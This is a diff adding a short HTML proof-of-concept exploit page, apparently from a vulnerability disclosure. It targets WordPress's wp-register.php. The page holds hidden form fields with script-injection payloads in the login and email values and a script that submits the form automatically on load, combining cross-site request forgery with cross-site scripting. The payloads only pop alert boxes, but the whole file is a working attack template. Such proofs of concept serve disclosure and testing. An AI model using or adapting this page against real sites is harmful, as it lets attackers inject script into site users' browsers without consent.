@@ -1,0 +1,14 @@
+<html>
+<head></head>
+<body>
+
+<form method="post" action="http://target/wordpress/wp-register.php" >
+<input type="hidden" name="action" value="register" />
+<input type="hidden" name="user_login" id="user_login"
+value='"><script>alert(1)</script>' />
+<input type="hidden" name="user_email" id="user_email"
+value='"><script>alert(2)</script>' />
+</form>
+<script>document.forms[0].submit()</script>
+</body>
+</html>
